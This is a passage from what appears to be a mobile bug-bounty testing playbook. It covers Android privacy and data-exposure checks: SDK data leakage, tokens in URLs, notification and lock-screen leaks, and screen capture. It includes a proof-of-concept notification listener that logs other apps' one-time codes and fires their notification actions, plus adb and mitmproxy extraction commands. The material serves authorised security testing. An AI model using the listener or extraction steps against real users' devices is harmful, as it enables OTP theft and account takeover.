NEEDLES = [b'zq4h7m2kx9', b'zq4h7m2kx9@example.invalid', b'15550137742', b'1970-01-01', b'zk8v3p1nd6']
def response(f):
    body = (f.request.content or b'') + (f.response.content or b'') + f.request.pretty_url.encode()
    for n in NEEDLES:
        if n in body:
            print(f.request.pretty_host, f.request.path[:70], n.decode())
PY
```
  MASTG ships an equivalent `mitm_sensitive_logger.py` whose core is a `SENSITIVE_DATA` dict of marker
  values, a `contains_sensitive_data()` check over URL / request body / response body, and an append to
  `sensitive_data.log`, wired into both `def request(flow)` and `def response(flow)`.
  Then pull the declaration side:
```bash
# the Data safety section is on the Play listing; record data types + "shared with third parties"
# and the privacy policy URL from the same listing
aapt2 d badging app.apk | grep -i 'package:\|versionName'
```
- **Proof:** A `sensitive_data.log`-shaped entry showing the marker leaving the device to a named host, side
  by side with the app's published Data safety declaration that omits that data type or that recipient —
  e.g.
```
REQUEST URL: https://collector.example-analytics.com/v2/e
Request Body: uid=…&email=zq4h7m2kx9%40example.invalid&lat=51.5074&lon=-0.1278
```
  with the listing declaring neither "Email address" nor "Approximate/precise location" as shared.
- **Escalation:** -> D20-019 to name the SDK; -> D20-020 if consent toggles do not change it; -> D18 if the
  recipient's backend is itself misconfigured. Frame it as data exposure to an unauthorised party with a
  concrete captured payload — **never as a compliance argument**, which Intigriti's standard rejects
  outright.
- **Ruled out when:** A full-flow capture with the marker set produces hits only on first-party hosts, for
  data types the Data safety section declares as collected, with no third-party recipient. Attach the
  host × data-type matrix with the declaration column filled in.

### D20-026 · PII placed in URL query parameters, and the referer consequence

| | |
|---|---|
| **Severity ceiling** | Medium (High for a session or reset token) |
| **VRT** | `sensitive_data_exposure.sensitive_token_in_url.user_facing` (P4), `…on_password_reset` (P5), `sensitive_data_exposure.non_sensitive_token_in_url` (P5); with a third-party referer recipient, `sensitive_data_exposure.token_leakage_via_referer.untrusted_third_party` (P4) |
| **Attacker** | AM-08 / AM-09 |
| **Applies to** | all apps with a remote backend; the WebView half applies to any in-app browser |
| **Maps to** | OWASP Mobile Top 10 2024 M6 — *"URL query parameters: Data visible in server logs and browser history"*; MASWE-0073; MASVS-PRIVACY-3 |

- **Test:** A value in a query string is copied into CDN logs, proxy logs, WebView history and — if the URL
  is loaded in a WebView with third-party resources — the `Referer` header sent to each of them. The
  remediation to state is exactly M6's: move the value into the POST body or a header.
- **How:** Use the mitmproxy query-key sweep from D20-015, then check the WebView half:
```bash
grep -rnE 'loadUrl\(|loadDataWithBaseURL|CustomTabsIntent|setAcceptThirdPartyCookies' out/sources/
# capture what the WebView sends as Referer to third-party hosts on that page
mitmdump -nr run.mitm -s /dev/stdin <<'PY'
def request(f):
    r = f.request.headers.get('referer')
    if r and ('token' in r or 'zq4h7m2kx9' in r):
        print(f.request.pretty_host, '<- Referer:', r[:120])
PY
```
- **Proof:** A full URL containing PII or a token in the query string; and, for the referer variant, a
  request to a third-party host whose `Referer` carries it.
- **Escalation:** -> D10 (WebView history and referer); -> D13 if the token is a reset or session token.
- **Ruled out when:** No authenticated or identifying value appears in any query string across the flow set,
  and no `Referer` to a third-party host contains one. Report the suspect-key sweep's zero count.

### D20-027 · Fat profile endpoints returning fields the app never renders

| | |
|---|---|
| **Severity ceiling** | Critical (recovery codes, password hashes, auth tokens) down to Medium (excess PII) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); a recovery-code dump chains to `broken_authentication_and_session_management.two_fa_bypass` (P3) or `…authentication_bypass` (P1) |
| **Attacker** | AM-05 (own account, own token — then escalate cross-user via D15) |
| **Applies to** | all mobile backends |
| **Maps to** | `hunt-mfa-bypass` recovery-code dump; `hunt-graphql` field-level authorisation; `triage-validation` anti-patterns list; CWE-200 |

- **Test:** The mobile client displays three fields; the API returns forty — including recovery codes,
  internal flags, moderation notes, and other users' identifiers. **The calibration matters:** "the API
  returns more fields than necessary" is an anti-pattern that loses money unless the extra fields are
  actually sensitive. Name the field and why it is sensitive, or do not file it.
- **How:**
```bash
# 1. what does the UI render? (from the layout and the model class)
grep -rnE 'data class (User|Profile|Account|Me)\b' -A40 out/sources/
# 2. what does the API actually return?
curl -s https://api.target.example/v1/me -H "Authorization: Bearer $A" | jq 'keys'
curl -s https://api.target.example/v1/me -H "Authorization: Bearer $A" \
  | jq -r 'paths(scalars) as $p | "\($p|join("."))"' | sort
# 3. cross-check the spec for fields no screen uses
jq -r '.components.schemas | keys[]' openapi.json 2>/dev/null
```
- **Proof:** The response body with the sensitive fields named — recovery codes, a password hash, an
  internal role flag, another user's identifier — and, for the cross-user case, the same fields retrieved
  with a second account's token (marker-verified).
- **Escalation:** -> D13 if recovery codes or an MFA secret are present (that is an MFA bypass, filed
  separately); -> D15 for the field-level authorisation and IDOR directions.
- **Ruled out when:** Every field in the response is either rendered by some screen or non-sensitive
  (timestamps, feature flags, display preferences). List the unrendered fields and why each is benign —
  that list is the negative.

### D20-028 · Authenticated responses cacheable, and cached on disk

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); the on-disk half is `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_internal_storage` (P5) |
| **Attacker** | AM-05 (a shared device), AM-04 where the cache is reachable |
| **Applies to** | all |
| **Maps to** | sehno "Test for cache management on HTTP (eg Pragma, Expires, Max-age)"; MASTG-TEST-0320 (WebViews Not Cleaning Up Sensitive Data) for the WebView cache half; CWE-524 |

- **Test:** Two halves. Server side: does a PII-bearing response carry `Cache-Control: no-store`? Client
  side: does the app's own HTTP cache (OkHttp `Cache`, WebView cache) keep the body on disk after logout?
- **How:**
```bash
curl -sI -H "Authorization: Bearer $TOK" https://api.target.example/v1/me | grep -iE 'cache-control|pragma|expires|vary'
adb shell run-as $PKG sh -c 'ls -la cache/ files/ app_webview/Default 2>/dev/null'
adb shell run-as $PKG sh -c 'grep -rl "zq4h7m2kx9" cache/ files/ 2>/dev/null' | head
adb exec-out run-as $PKG tar c app_webview/Default 2>/dev/null > webview.tar && tar xf webview.tar
strings -n 6 "app_webview/Default/Local Storage/leveldb/"*.log 2>/dev/null | grep -aiE 'zq4h7m2kx9|token|email'
```
- **Proof:** `Cache-Control: public` (or a missing `no-store`) on a PII response, and the same marker found
  in the app's on-disk cache after logout.
- **Escalation:** -> D15 web-cache deception if a shared cache is involved; -> D11 for the on-disk payload's
  reachability; -> D20-060 if it survives logout.
- **Ruled out when:** Every authenticated response carries `Cache-Control: no-store` (or `private, no-cache`
  with a correct `Vary`), and a post-logout grep of `cache/`, `files/` and the WebView profile for the marker
  returns zero across a non-zero file count.

### D20-029 · Contacts and calendar harvesting on the invite / find-friends flow

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) — this is third-party PII (the contacts themselves never consented) |
| **Attacker** | AM-08; the data subjects are people who are not users of the app at all |
| **Applies to** | all apps with an invite, "find people you know", or contact-sync feature |
| **Maps to** | T1636.003 Protected User Data: Contact List; T1636.001 Calendar Entries; MASTG-TEST-0254 (Dangerous App Permissions), MASTG-TEST-0255 (Permission Requests Not Minimized); MASWE-0067 (Lack of Anonymisation or Pseudonymisation Measures); CWE-359 |

- **Test:** Four questions, each a different finding: (a) is the **whole** address book uploaded or only the
  contact the user picked; (b) is it uploaded **before** the user picks anyone; (c) are phone numbers hashed,
  and if so, is the hash unsalted MD5/SHA-1 (trivially reversible across the phone-number keyspace); (d) is
  the data retained server-side after the invite is sent.
- **How:**
```bash
grep -rnE 'ContactsContract|READ_CONTACTS|CalendarContract|READ_CALENDAR|CommonDataKinds\.(Phone|Email)|uploadContacts|syncContacts|hashPhone|normalizePhone' out/sources/
# seed canary contacts, then proxy the invite flow
adb shell content insert --uri content://com.android.contacts/raw_contacts \
  --bind account_name:s:canary --bind account_type:s:canary
adb shell content insert --uri content://com.android.contacts/data \
  --bind raw_contact_id:i:1 --bind mimetype:s:vnd.android.cursor.item/name \
  --bind data1:s:zq4h7m2kx9
# then: open the invite screen and capture BEFORE tapping any contact
mitmdump -nr invite.mitm --set flow_detail=3 2>/dev/null | grep -c zq4h7m2kx9
# days later, is it still there?
curl -s https://api.target.example/v1/me/contacts -H "Authorization: Bearer $A" | jq 'length'
```
- **Proof:** A request body containing the full address book captured **before** any contact was selected,
  or unsalted phone hashes, plus a follow-up `GET` showing the data still present days later.
- **Escalation:** Reversible phone hashes plus the user-search oracle in D15 is full social-graph
  reconstruction. -> D20-025 if the Data safety section does not declare contacts.
- **Ruled out when:** The upload contains only the contact the user explicitly selected, sent after
  selection, with a salted/peppered identifier or no identifier at all, and a retention endpoint shows it
  is not persisted. Capture the "before selection" flow list showing zero contact payloads.

### D20-030 · Lock-screen notification content — visibility, channel override, and `setPublicVersion`

| | |
|---|---|
| **Severity ceiling** | High (an OTP on a locked screen is a second-factor bypass for anyone holding the device) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); with an OTP, `broken_authentication_and_session_management.two_fa_bypass` (**P3**) |
| **Attacker** | **AM-10** physical locked — the rare item where AM-10 is the primary model |
| **Applies to** | all. MASTG's evaluation uses **`minSdkVersion`**, not `targetSdkVersion`, because that "ensures the test accounts for the least secure environment in which the app can operate": it fails if sensitive data is exposed **and** (`minSdkVersion >= 33` with `POST_NOTIFICATIONS` declared) **or** (`minSdkVersion <= 32`, regardless of the permission) |
| **Maps to** | MASTG-TEST-0315 (Sensitive Data Exposed via Notifications) — named data types "personally identifiable information (PII), one-time passwords (OTPs), or other sensitive data, like health or financial details"; MASWE-0037 (CWE-200, CWE-359); MASTG-KNOW-0054; MASTG-BEST-0027; semgrep rules `mastg-android-sensitive-data-in-notifications` and `…-manifest`; mobsfscan `android_sensitive_notification`; deprecated predecessor MASTG-TEST-0005; developer.android.com `develop/ui/views/notifications/build-notification` (`VISIBILITY_PUBLIC` / `VISIBILITY_PRIVATE` / `VISIBILITY_SECRET`, `setPublicVersion()`, channel `lockscreenVisibility`); T1517 |

- **Test:** Three settings interact and developers get the precedence wrong. `VISIBILITY_PUBLIC` shows full
  content on the keyguard; `VISIBILITY_PRIVATE` shows only basic info **and should be paired with
  `setPublicVersion()`** or the system substitutes a generic line; `VISIBILITY_SECRET` shows nothing. The
  **channel's** `lockscreenVisibility` can override the per-notification value, so check both.
- **How:**
```bash
grep -rnE 'NotificationCompat\.Builder|Notification\.Builder|setContentTitle\(|setContentText\(|setStyle\(|BigTextStyle|setTicker\(|setVisibility\(|VISIBILITY_(PUBLIC|PRIVATE|SECRET)|setPublicVersion\(|lockscreenVisibility|createNotificationChannel' out/sources/
semgrep -c rules/mastg-android-sensitive-data-in-notifications.yml out/sources/
semgrep -c rules/mastg-android-sensitive-data-in-notifications-manifest.yml out/resources/AndroidManifest.xml
xmlstarlet sel -t -v "//uses-sdk/@android:minSdkVersion" -n out/AndroidManifest.xml
grep -n 'POST_NOTIFICATIONS' out/AndroidManifest.xml
# empirical
adb shell input keyevent KEYCODE_SLEEP
# trigger the OTP / transaction / message notification, then:
adb shell dumpsys notification --noredact | sed -n "/$PKG/,/^$/p" | grep -iE 'visibility|android.title|android.text|android.bigText|tickerText|channel'
adb exec-out screencap -p > lockscreen.png
```
- **Proof:** `dumpsys notification --noredact` showing `android.text` (or `android.bigText`, or `tickerText`)
  carrying the OTP / balance / message body, **plus** the lock-screen capture showing it rendered, **plus**
  `visibility=PUBLIC` (or a channel `lockscreenVisibility` that overrides a private notification) and no
  `publicVersion`.
- **Escalation:** -> D13 (physical-proximity MFA bypass); -> D20-031 for the listener half, which needs no
  physical access at all; -> D20-033 for notification history, which keeps it after dismissal.
- **Ruled out when:** Every sensitive notification uses `VISIBILITY_SECRET`, or `VISIBILITY_PRIVATE` with a
  `setPublicVersion()` that carries no sensitive text, and its channel's `lockscreenVisibility` does not
  widen it — verified by a lock-screen capture showing only the generic line. Attach that capture.

### D20-031 · `NotificationListenerService` reading `Notification.extras` — build the PoC listener

| | |
|---|---|
| **Severity ceiling** | High (Critical when the value is an OTP that completes an account takeover) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); with an OTP, `broken_authentication_and_session_management.two_fa_bypass` (**P3**) |
| **Attacker** | **AM-04** — notification access is a single user toggle, no dangerous permission |
| **Applies to** | all |
| **Maps to** | developer.android.com `reference/android/service/notification/NotificationListenerService` (`BIND_NOTIFICATION_LISTENER_SERVICE`, `onNotificationPosted`, `getActiveNotifications()`, `Notification.extras`, `Notification.EXTRA_TEXT`, `contentIntent`); MASWE-0037; MASTG-TEST-0315; Google Mobile VRP Low Impact Data includes "content of a user's messages (email, instant messages, text messages)"; empirical: Mail.ru "read new emails from any inbox in notification center" **$10,000**; T1517 Access Notifications (ATT&CK: *"In the case of Credential Access, adversaries may attempt to intercept one-time code sent to the device"*; Escobar "steals Google Authenticator MFA codes"; SharkBot "intercepts notifications and leverages Direct Reply features"; mitigation: **Application Developer Guidance — avoid sensitive data in notification text**); T1644 Out of Band Data |

- **Test:** Lock-screen visibility settings are irrelevant here: a listener reads `Notification.extras`
  regardless, including `EXTRA_TEXT`, `EXTRA_BIG_TEXT`, `EXTRA_TITLE`, every action's label, and the
  `contentIntent` itself. The notification-access grant is a normal, user-facing toggle that banking
  trojans routinely obtain, and it is the precondition you must state honestly.
- **How:** Ship a minimal listener in the attacker app:
```xml
<service android:name=".Listener" android:exported="true"
         android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
  <intent-filter><action android:name="android.service.notification.NotificationListenerService"/></intent-filter>
</service>
```
```java
public class Listener extends NotificationListenerService {
  @Override public void onNotificationPosted(StatusBarNotification sbn) {
    Bundle x = sbn.getNotification().extras;
    Log.e("POC", sbn.getPackageName() + " | title=" + x.getCharSequence(Notification.EXTRA_TITLE)
        + " | text=" + x.getCharSequence(Notification.EXTRA_TEXT)
        + " | big=" + x.getCharSequence(Notification.EXTRA_BIG_TEXT)
        + " | intent=" + sbn.getNotification().contentIntent);
  }
}
```
```bash
adb install poc-listener.apk
adb shell cmd notification allow_listener com.poc/.Listener
adb shell settings get secure enabled_notification_listeners
# trigger the target's OTP / message / transaction notification
adb logcat -s POC:E -d
```
- **Proof:** Your PoC's own log line containing the OTP / message body / balance, with the target's package
  name in the same line, plus a screenshot of the ordinary settings toggle the user flipped. State the
  attacker app's permission set — ideally empty besides the listener binding.
- **Escalation:** -> D09/D28 join: the listener also reads the notification's deep link and its extras, then
  replays that deep link itself (see Cross-surface joins); -> D08 if the `contentIntent` is a mutable
  `PendingIntent`; -> D13 for the OTP.
- **Ruled out when:** The target's notifications carry no sensitive value in any `extras` key — the OTP is
  delivered only in-app, the message body is replaced by "New message", the balance is omitted — verified by
  the PoC listener logging only generic strings. Keep that log as the negative.

### D20-032 · Android 15 OTP redaction for listeners, and the apps that route around it

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (**P3**) |
| **Attacker** | AM-04 |
| **Applies to** | **Android 15+**, all apps regardless of targetSdk |
| **Maps to** | developer.android.com `about/versions/15/behavior-changes-all` — *"Untrusted apps implementing `NotificationListenerService` cannot read unredacted OTP content from notifications. Trusted companion device associations exempt. System automatically redacts OTPs"*; T1517 |

- **Test:** Android 15 redacts OTP content from untrusted listeners, with a carve-out for trusted
  companion-device associations. Two findings live here. (a) The app under test *is* a listener and has been
  built to obtain a `CompanionDeviceManager` association purely to keep reading OTPs. (b) The app under test
  *sends* OTPs in a shape the redaction heuristic misses — the code in the title rather than the body, the
  code split across an action label, the code in an accessibility node, or the code placed on the clipboard.
- **How:**
```bash
grep -rn 'BIND_NOTIFICATION_LISTENER_SERVICE\|NotificationListenerService' out/AndroidManifest.xml out/sources/
grep -rn 'CompanionDeviceManager\|REQUEST_COMPANION_PROFILE\|REQUEST_COMPANION_RUN_IN_BACKGROUND\|associate(' out/AndroidManifest.xml out/sources/
adb shell cmd notification allow_listener com.poc/.Listener
adb shell dumpsys notification | grep -iE 'listener|redact'
# trigger the target's OTP notification on an Android 15 device and read the PoC's log
adb logcat -s POC:E -d
```
- **Proof:** The test listener receiving an **unredacted** 6-digit code on Android 15 from the target app —
  which proves the app's OTP delivery falls outside the platform's redaction heuristics — or the target
  holding a companion-device association whose only purpose is the exemption.
- **Escalation:** -> D13 account takeover. On devices below Android 15, D20-031 already covers it; say which
  API levels your claim applies to.
- **Ruled out when:** On Android 15 the PoC listener receives the notification with the code replaced by the
  redaction placeholder, and the code appears nowhere else (title, action label, clipboard, accessibility
  tree). Test all four routes before writing the negative.

### D20-033 · Notification history retains the content after dismissal

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `insecure_os_firmware.failure_to_remove_sensitive_artifacts_from_disk` (null); `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-11 physical unlocked, AM-05 shared device |
| **Applies to** | **Android 11+ (API 30+)** where the user has enabled notification history |
| **Maps to** | hackwithsingh sec-14-14 #48 "notification history accessible via settings reveals sensitive data", #42 "ticker text reveals sensitive information on status bar", #17 "big text style exposes full message content on lock screen"; MASWE-0037 |

- **Test:** Dismissing a notification does not remove it. Android 11's notification history keeps recent
  notifications in Settings, so an OTP or message body the user swiped away minutes ago is still readable by
  whoever next picks up the unlocked device. Apps that rely on "the notification is transient" are wrong.
- **How:**
```bash
adb shell settings put secure notification_history_enabled 1
# trigger the notification, dismiss it, then:
adb shell dumpsys notification --noredact | grep -iA6 'history\|HistoryArchive'
# and on device: Settings > Notifications > Notification history
adb exec-out screencap -p > nhistory.png
```
- **Proof:** The dismissed OTP or message body still visible in notification history, screenshotted, with
  the time elapsed since dismissal.
- **Escalation:** -> D20-030 (same root cause — sensitive text in the notification); -> D13.
- **Ruled out when:** The app's sensitive notifications carry no sensitive text (so history retains nothing
  useful), or the app posts them with `setLocalOnly`/`FLAG_ONLY_ALERT_ONCE` semantics and the history entry
  shows only a generic line. Screenshot the history entry.

### D20-034 · Notification content during screen sharing, and the default-recorder exemption

| | |
|---|---|
| **Severity ceiling** | High (for an OTP or message body) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null); with an OTP, `broken_authentication_and_session_management.two_fa_bypass` (P3) |
| **Attacker** | AM-02 (a remote party on a support or casting session — the classic remote-access-scam vector) |
| **Applies to** | **Android 15+** for the platform protection; below that there is no protection at all |
| **Maps to** | developer.android.com `about/versions/15/behavior-changes-all` — "Notification content hidden during screen sharing"; `Notification.Builder.setPublicVersion()`; **"Default system screen recorder exempted"** |

- **Test:** Android 15 hides notification content during screen sharing and lets the app supply an
  alternative via `setPublicVersion()`. An app that puts sensitive content in a notification and supplies no
  public version is relying entirely on the platform's judgment — and the protection **does not apply to the
  default system screen recorder**, which is exempted. Test with the built-in recorder, not a third-party
  one, or you will report a false negative.
- **How:**
```bash
grep -rn 'setPublicVersion\|VISIBILITY_PRIVATE\|VISIBILITY_SECRET\|setVisibility(' out/sources/
# start the BUILT-IN screen recorder (Quick Settings tile), then post the sensitive notification
adb shell screenrecord --time-limit 20 /sdcard/r.mp4 &   # note: adb screenrecord is a separate path — see D20-039
adb pull /sdcard/r.mp4
```
- **Proof:** The OTP, balance or message body visible in the default recorder's output, or in a screen-share
  session recorded from the far end.
- **Escalation:** -> D20-038 (`setContentSensitivity` for the in-app view half); -> D13.
- **Ruled out when:** Every sensitive notification supplies a `setPublicVersion()` whose text is generic, and
  the recorded output shows only that generic line. Attach the frame.

### D20-035 · `RemoteInput` / Direct Reply actions exposed on a sensitive notification

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null = rated on what it exposes) |
| **Attacker** | AM-04 (notification access) |
| **Applies to** | all apps posting notifications with actions |
| **Maps to** | T1517 Access Notifications (ATT&CK: SharkBot "intercepts notifications and leverages Direct Reply features"); developer.android.com `NotificationListenerService` (`Notification.Action.actionIntent`, `RemoteInput`) |

- **Test:** A notification listener does not only read — it can **fire** a notification's actions and fill a
  `RemoteInput`. If any action performs a sensitive operation (reply to a chat, approve a login, confirm a
  transfer, mark a transaction as recognised), notification access becomes an action primitive rather than a
  read primitive.
- **How:**
```bash
grep -rnE 'addAction\(|Notification\.Action|RemoteInput\.Builder|setAllowGeneratedReplies|PendingIntent\.getBroadcast|PendingIntent\.getService' out/sources/ | grep -i notif -A4
adb shell dumpsys notification --noredact | grep -iE 'actions|actionIntent|remoteInput'
```
  From the PoC listener, enumerate and fire:
```java
Notification n = sbn.getNotification();
if (n.actions != null) for (Notification.Action a : n.actions) {
  Log.e("POC", "action=" + a.title + " intent=" + a.actionIntent
      + " remoteInputs=" + (a.getRemoteInputs() != null ? a.getRemoteInputs().length : 0));
  // a.actionIntent.send(ctx, 0, fillInIntent);   // only against your own test account
}
```
- **Proof:** The listener enumerating a sensitive action, then the action completing (a reply sent, an
  approval recorded) with the server-side state change shown — run only against your own test account.
- **Escalation:** -> D08 if the `actionIntent` is a mutable `PendingIntent` (then the listener also controls
  its contents); -> D13 if the action approves a login.
- **Ruled out when:** No notification carries an action that performs a state change without a further
  in-app, authenticated confirmation — enumerate the action list and show each one opens a UI rather than
  committing.

### D20-036 · The screen-capture consumer inventory — decide who can capture before testing whether they can

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5) is the trap node; the escalation is `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-04 (MediaProjection or accessibility consumer), AM-08 (in-process SDK), AM-11 (physical) |
| **Applies to** | all |
| **Maps to** | T1513 Screen Capture (ATT&CK: *"Background applications can capture screenshots or videos of another application running in the foreground by using the Android `MediaProjectionManager` (generally requires the device user to grant consent)"*; mitigation *"Application developers can apply the `FLAG_SECURE` property to sensitive screens"*; *"An adversary with root access or Android Debug Bridge (adb) access could call the Android `screencap` or `screenrecord` commands"*); T1453; MASWE-0038 |

- **Test:** "No `FLAG_SECURE`" is P5 (`screen_caching_enabled`) and Bugcrowd's own remediation text calls the
  fix "a best practice". Before running any capture test, decide which of the five consumers you can actually
  demonstrate, because the consumer decides the rating and, more importantly, the *route*:
  1. **The system Recents snapshot** — D04-043 owns it; AM-11/AM-05, Low.
  2. **`adb screencap` / `screenrecord`** — AM-11/AM-12; evidence-gathering, not an attack in itself.
  3. **A `MediaProjection` consumer** — AM-04, one consent dialog; see D20-037.
  4. **An in-process SDK capture** — AM-08, and **`FLAG_SECURE` does not stop it**; see D20-017, D20-018.
  5. **A remote viewer on a screen share** — AM-02; see D20-034, D20-038.
  Routes 4 and 5 are the ones nobody tests and the only ones that clear P5 reliably.
- **How:**
```bash
# who is capable right now?
adb shell dumpsys media_projection
adb shell settings get secure enabled_accessibility_services
grep -rn 'DETECT_SCREEN_CAPTURE\|MediaProjection\|FOREGROUND_SERVICE_MEDIA_PROJECTION' out/AndroidManifest.xml
# and what does the app itself do about it?
grep -rnE 'FLAG_SECURE|setContentSensitivity|setRecentsScreenshotEnabled|setFilterTouchesWhenObscured|registerScreenCaptureCallback|addScreenRecordingCallback' out/sources/
```
- **Proof:** A one-line statement in the report naming which consumer you demonstrated, with the artefact
  from the corresponding item. Do not present `adb screencap` on your own rooted device as the attack.
- **Escalation:** Play Integrity's `environmentDetails.appAccessRiskVerdict.appsDetected` names
  `KNOWN_CAPTURING` / `UNKNOWN_CAPTURING` and `KNOWN_CONTROLLING` / `UNKNOWN_CONTROLLING` — that is the
  vocabulary to use when arguing to a triager that the capturing consumer exists in the wild.
- **Ruled out when:** Every sensitive screen sets `FLAG_SECURE` **and** an in-process capture path (crash
  screenshot, session-replay frame) has been tested and produces a masked frame. `FLAG_SECURE` alone is not
  a complete negative — route 4 goes around it.

### D20-037 · `MediaProjection` per-session consent (Android 14) and the fallbacks apps chose instead

| | |
|---|---|
| **Severity ceiling** | High (persistent screen capture beyond the consent the user gave) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-04 for a third-party capturer; for the target app itself this is a covert-collection finding |
| **Applies to** | **targetSdk 34+** for the per-session rule; Android 15+ adds the status-bar chip and auto-stop on lock |
| **Maps to** | developer.android.com `about/versions/14/behavior-changes-14` — per-session consent, `SecurityException` on reusing a cached `createScreenCaptureIntent()` result, one `createVirtualDisplay()` per `MediaProjection`, mandatory `MediaProjection.Callback#onStop()` (otherwise `IllegalStateException`), `VirtualDisplay#resize()`/`setSurface()` for config changes; `about/versions/15/behavior-changes-all` — status-bar chip, "auto-stops when device screen locked"; `media/grow/media-projection`; T1513 |

- **Test:** From targetSdk 34 an app can no longer cache the projection consent `Intent` and silently
  re-capture. Two directions. (a) The target app still achieves silent repeat capture — it targets below 34,
  or abuses an exemption. (b) The target app *used* to cache consent and, in the release that removed the
  caching, fell back to something worse: a persistent `mediaProjection` foreground service kept alive across
  what the user perceives as separate sessions, or an accessibility service.
- **How:**
```bash
grep -rnE 'createScreenCaptureIntent|getMediaProjection|createVirtualDisplay|MediaProjection\.Callback|registerCallback|FOREGROUND_SERVICE_MEDIA_PROJECTION' out/sources/ out/AndroidManifest.xml
aapt2 d badging app.apk | grep targetSdkVersion
adb shell dumpsys media_projection
adb logcat -d | grep -i 'SecurityException.*MediaProjection'
# is an FGS staying alive between sessions?
adb shell dumpsys activity services $PKG | grep -iE 'mediaProjection|foreground|started'
```
- **Proof:** A second capture session starting with **no** new consent dialog — screen-record the absence of
  the prompt — or a `mediaProjection` FGS that persists across sessions, or an accessibility-service fallback
  appearing in the same release that removed the caching (diff the two APK versions).
- **Escalation:** -> D06 foreground-service-type abuse; -> D20-065 if the capture is also concealed.
- **Ruled out when:** `targetSdkVersion >= 34`, every capture session shows a fresh consent dialog, the
  `MediaProjection.Callback` is registered, and the FGS stops when capture stops (`dumpsys activity services`
  shows no lingering service).

### D20-038 · `setContentSensitivity` / screen-share protection unused on payment and PIN views

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (null) |
| **Attacker** | AM-02 (the remote viewer in a support-call or casting scam) |
| **Applies to** | **Android 15+**, all apps |
| **Maps to** | developer.android.com `about/versions/15/behavior-changes-all` — screenshare protection, `Notification.Builder.setPublicVersion()`, `View.setContentSensitivity(int)`, Developer Options "Disable screen share protections", default system screen recorder exempted; `about/versions/16/…` for `accessibilityDataSensitive` (see D20-050); MASWE-0038 |

- **Test:** Android 15 hides sensitive password input and OTP-bearing notification content from remote
  viewers, and lets an app mark its own views with `View.setContentSensitivity(int)`. A payment, PIN or
  recovery-phrase view that is neither `FLAG_SECURE` nor content-sensitivity-marked is fully visible to the
  far end of a screen share — which is the mechanism of the current generation of remote-access support scams.
- **How:**
```bash
grep -rn 'setContentSensitivity\|CONTENT_SENSITIVITY_SENSITIVE\|FLAG_SECURE\|setPublicVersion' out/sources/
# reproduce the remote view
scrcpy --no-control &     # or start a real screen share / cast session
# testing-only toggle, to confirm the protection is what is (or is not) acting:
adb shell settings put global disable_screen_share_protections 1
```
- **Proof:** Side by side — the sensitive field visible in the projected stream, and the same field redacted
  once `FLAG_SECURE` or sensitivity marking is applied in a patched build. State the Android version.
- **Escalation:** -> D20-034 for the notification half; -> D13 where the exposed field is a PIN or OTP.
- **Ruled out when:** Every sensitive view is either `FLAG_SECURE` or marked content-sensitive, and the
  projected stream shows it redacted on an Android 15 device. Capture the redacted frame.

### D20-039 · Screenshot and screen-recording detection callbacks available but unused

| | |
|---|---|
| **Severity ceiling** | Medium (a missing control; High where the screen shows a full PAN, a recovery phrase or a one-time code) |
| **VRT** | `insecure_data_storage.screen_caching_enabled` (P5) for the capture itself; the missing control has no node of its own — argue it as a contributing factor |
| **Attacker** | AM-04 / AM-11 |
| **Applies to** | **Android 14+** for screenshot detection, **Android 15+** for recording detection |
| **Maps to** | developer.android.com `about/versions/14/features/screenshot-detection` — `<uses-permission android:name="android.permission.DETECT_SCREEN_CAPTURE" />`, `Activity.ScreenCaptureCallback`, `registerScreenCaptureCallback(mainExecutor, cb)` in `onStart()`, `unregisterScreenCaptureCallback(cb)` in `onStop()`, per-activity scope, **"Only detects screenshots from hardware button combinations, not from ADB or instrumentation tests"**, the callback does not receive the image, and `FLAG_SECURE` prevents capture entirely; `about/versions/15/features` — `WindowManager.addScreenRecordingCallback()`, `SCREEN_RECORDING_STATE_VISIBLE`, `removeScreenRecordingCallback` |

- **Test:** For an app whose threat model includes remote-access-trojan scams — banking, crypto, brokerage —
  the absence of both callbacks on the transaction screen is a missing control worth naming. Report it only
  where you can also show a concrete capture succeeding.
- **How:**
```bash
grep -n 'DETECT_SCREEN_CAPTURE' out/AndroidManifest.xml
grep -rnE 'registerScreenCaptureCallback|unregisterScreenCaptureCallback|ScreenCaptureCallback|addScreenRecordingCallback|SCREEN_RECORDING_STATE_VISIBLE' out/sources/
# capture with the HARDWARE button combination, not adb — adb capture is documented as undetectable
adb shell input keyevent KEYCODE_SYSRQ   # or press Power+VolDown physically
```
- **Proof:** A screenshot of the PIN or transfer-confirmation screen taken by the hardware combination, with
  no app-side reaction — no blur, no warning, no session invalidation — on a screen that also lacks
  `FLAG_SECURE`. **Do not use `adb shell screencap` as the PoC for this item**: the documentation states ADB
  capture is not detected, so it proves nothing about the callback.
- **Escalation:** -> D20-038; -> D23 where the screen authorises a transaction.
- **Ruled out when:** `FLAG_SECURE` is set on the screen (which makes detection moot), or the callback is
  registered and the app visibly reacts to a hardware-button capture. Record the reaction.

### D20-040 · Recents snapshot and the `FLAG_SECURE` family — the privacy framing that changes the rating

| | |
|---|---|
| **Severity ceiling** | Low |
